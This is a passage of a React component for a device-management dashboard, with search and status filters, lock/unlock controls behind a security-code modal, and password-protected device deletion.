  const lockModalTitle = useMemo(() => {
    if (!lockCodeAction) return "Authorization Required";
    if (lockCodeAction === "lock-all") return "🔒 Lock All Devices";
    if (lockCodeAction === "unlock-all") return "🔓 Unlock All Devices";
    if (typeof lockCodeAction === "object") return lockCodeAction.lock ? "🔒 Lock Device" : "🔓 Unlock Device";
    return "Authorization Required";
  }, [lockCodeAction]);

  return (
    <AnimatedAppBackground>
      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
        <SurfaceCard className="p-4">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0">
              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Devices</div>
              <div className="text-[12px] text-slate-500">Manage all registered devices</div>
            </div>

            <div className="flex shrink-0 flex-wrap items-center gap-2">
              {/* Lock All / Unlock All button */}
              <button
                onClick={() => openLockModal(areAllLocked ? "unlock-all" : "lock-all")}
                disabled={lockingAll || devices.length === 0}
                className={["h-10 rounded-2xl border px-4 text-[13px] font-extrabold transition active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60",
                  areAllLocked
                    ? "border-amber-200 bg-amber-50 text-amber-700 hover:bg-amber-100"
                    : "border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100",
                ].join(" ")}
                type="button"
                title={areAllLocked ? "Unlock all devices" : "Lock all devices"}
              >
                {lockingAll ? "…" : areAllLocked ? "🔓 Unlock All" : "🔒 Lock All"}
              </button>

              <button onClick={handleCheckAll} disabled={checkingAll || devices.length === 0}
                className={["h-10 rounded-2xl border border-sky-200 bg-sky-50 px-4 text-sky-700 transition active:scale-[0.99]", "hover:bg-sky-100 disabled:cursor-not-allowed disabled:opacity-60"].join(" ")}
                type="button" title="Check all devices">
                {checkingAll ? "Checking…" : "Check All"}
              </button>

              <button onClick={handleManualRefresh}
                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 transition hover:bg-slate-50"
                type="button" title="Refresh">↻</button>
            </div>
          </div>

          <div className="mt-4">
            <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search brand / model / id"
              className={["h-11 w-full rounded-2xl px-4 text-[14px]", "border border-slate-200 bg-white", "text-slate-900 placeholder:text-slate-400", "outline-none transition", "focus:border-sky-300 focus:ring-2 focus:ring-sky-100"].join(" ")} />
          </div>

          <div className="mt-3 flex items-center justify-between gap-2">
            <div className="text-[12px] text-slate-500">Results: {filtered.length}</div>
            <select value={filter} onChange={(e) => handleFilterChange(e.target.value as DeviceFilter)}
              className={["h-10 rounded-2xl px-3 text-[13px] font-semibold", "border border-slate-200 bg-white", "text-slate-800 outline-none"].join(" ")}>
              <option value="all">All</option>
              <option value="online">Online</option>
              <option value="idle">Sleeping</option>
              <option value="offline">Offline</option>
              <option value="uninstalled">Uninstalled</option>
              <option value="favorites">Favorites</option>
            </select>
          </div>

          <div ref={listRef} className="mt-4">
            {loading && devices.length === 0 ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">Loading…</div>
            ) : filtered.length === 0 ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">No devices found.</div>
            ) : (
              <>
                {topSpacer > 0 && <div style={{ height: topSpacer }} />}
                {visibleRows.map((d, idx) => {
                  const absoluteIndex = shouldVirtualize ? visibleRange.start + idx : idx;
                  const displayNumber = filtered.length - absoluteIndex;
                  return (
                    <div key={d.renderKey} className="mb-3" style={shouldVirtualize ? { height: LIST_ROW_HEIGHT } : undefined}>
                      <DeviceCard
                        device={d} displayNumber={displayNumber}
                        isChecking={checkingDeviceId === d.deviceId || checkingAll}
                        isDeleting={deletingDeviceId === d.deviceId}
                        isLocking={lockingDeviceId === d.deviceId}
                        onOpen={handleOpen} onToggleFavorite={toggleFavoriteHandler}
                        onCheckOnline={handleCheckOnline} onDelete={handleDeleteDevice}
                        onToggleLock={handleToggleDeviceLock}
                      />
                    </div>
                  );
                })}
                {bottomSpacer > 0 && <div style={{ height: bottomSpacer }} />}
              </>
            )}
          </div>

          {success && <div className="mt-4 rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">{success}</div>}
          {error && <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{error}</div>}
        </SurfaceCard>
      </div>

      {/* ── Lock Code Modal ── */}
      <Modal open={lockCodeModalOpen} onClose={closeLockModal} title={lockModalTitle}>
        <div className="space-y-4">
          <div className="rounded-2xl border border-amber-200 bg-amber-50 px-3 py-3 text-sm text-slate-700">
            Enter the security code to authorize this action.
          </div>
          <div>
            <div className="mb-1 text-xs font-semibold text-slate-600">Security Code</div>
            <input
              type="password" inputMode="numeric" value={lockCode}
              onChange={(e) => { setLockCode(e.target.value); setLockCodeError(null); }}
              onKeyDown={(e) => { if (e.key === "Enter") handleConfirmLockCode(); }}
              placeholder="Enter security code"
              className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100"
              autoFocus
            />
          </div>
          {lockCodeError && <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{lockCodeError}</div>}
          <div className="grid grid-cols-2 gap-2 pt-1">
            <button type="button" onClick={closeLockModal} className="h-11 rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button>
            <button type="button" onClick={handleConfirmLockCode} className="h-11 rounded-2xl bg-slate-900 px-4 text-[14px] font-extrabold text-white">Confirm</button>
          </div>
        </div>
      </Modal>

      {/* ── Delete Modal ── */}
      <Modal open={deleteModalOpen} onClose={closeDeleteModal} title={deleteModalMode === "change" ? "Change Delete Password" : "Enter Password to Delete Device"}>
        {deleteModalMode === "delete" ? (
          <form onSubmit={handleSubmitDelete} className="space-y-4">
            <div className="rounded-2xl border border-amber-200 bg-amber-50 px-3 py-3 text-sm leading-6 text-slate-700">{deleteHelpText}</div>
            {deleteTargetDeviceId ? <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-[12px] text-slate-600"><div className="font-bold text-slate-900">Selected Device</div><div className="mt-1 break-all">{deleteTargetDeviceId}</div></div> : null}
            <div>
              <div className="mb-1 text-xs font-semibold text-slate-600">{deletePasswordSet === false ? "Create Password" : "Password"}</div>
              <input type="password" value={deletePassword} onChange={(e) => setDeletePassword(e.target.value)} placeholder={deletePasswordSet === false ? "Enter new 4-digit password" : "Enter delete password"} className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" autoFocus />
              <div className="mt-1 text-[11px] text-slate-500">Password must be at least 4 digits.</div>
            </div>
            {deleteError ? <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{deleteError}</div> : null}
            {deleteSuccess ? <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">{deleteSuccess}</div> : null}
            <div className="grid grid-cols-1 gap-2 pt-1">
              <button type="submit" disabled={deleteBusy} className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60">{deleteBusy ? "Processing..." : "Delete Device"}</button>
              <button type="button" onClick={() => { setDeleteModalMode("change"); setDeleteError(null); setDeleteSuccess(null); }} className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800">Change Password</button>
              <button type="button" onClick={closeDeleteModal} className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button>
            </div>
          </form>
        ) : (
          <form onSubmit={handleChangeDeletePassword} className="space-y-4">
            <div className="rounded-2xl border border-sky-200 bg-sky-50 px-3 py-3 text-sm leading-6 text-slate-700">{deleteHelpText}</div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">Current Password</div><input type="password" value={changeCurrentPassword} onChange={(e) => setChangeCurrentPassword(e.target.value)} placeholder="Enter current password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" autoFocus /></div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">New Password</div><input type="password" value={changeNewPassword} onChange={(e) => setChangeNewPassword(e.target.value)} placeholder="Enter new 4-digit password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" /></div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">Confirm New Password</div><input type="password" value={changeConfirmPassword} onChange={(e) => setChangeConfirmPassword(e.target.value)} placeholder="Confirm new password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" /></div>
            {deleteError ? <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{deleteError}</div> : null}
            {deleteSuccess ? <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">{deleteSuccess}</div> : null}
            <div className="grid grid-cols-1 gap-2 pt-1">
              <button type="submit" disabled={deleteBusy} className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60">{deleteBusy ? "Saving..." : "Save New Password"}</button>
              <button type="button" onClick={() => { setDeleteModalMode("delete"); setDeleteError(null); setDeleteSuccess(null); }} className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800">Back to Delete</button>
              <button type="button" onClick={closeDeleteModal} className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button>
            </div>
          </form>
        )}
      </Modal>
    </AnimatedAppBackground>
  );
}
